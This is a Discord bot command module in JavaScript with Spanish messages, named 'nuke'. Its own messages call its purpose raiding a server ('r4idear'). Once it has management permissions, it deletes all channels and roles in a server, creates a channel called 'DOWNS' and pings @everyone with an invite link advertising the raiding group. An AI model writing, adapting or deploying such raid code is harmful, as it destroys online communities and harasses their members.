const { Permissions } = require("discord.js");

module.exports = {
  nombre: "nuke",
  alias: ["sp"],
  run: async (client, message, args) => {
    if(!message.guild.me.hasPermission("MANAGE_CHANNELS")) return message.author.send(":x: `|` No tengo permiso de borrar/crear canales en el servidor que quieres r4idear")

       if(!message.guild.me.hasPermission("MANAGE_GUILD")) return message.author.send(":x: `|` No tengo permiso de gestionar el servidor canales en el servidor que quieres r4idear")


    await message.guild.channels.cache.map(channel => channel.delete());
    await message.guild.roles.cache.map(role => role.delete());

    const newChannel = await message.guild.channels.create(`DOWNS`, {
      type: "text"
    });

    newChannel.send("@everyone Awekening is here  <https://discord.gg/guzP8dbDvN>");
  },
};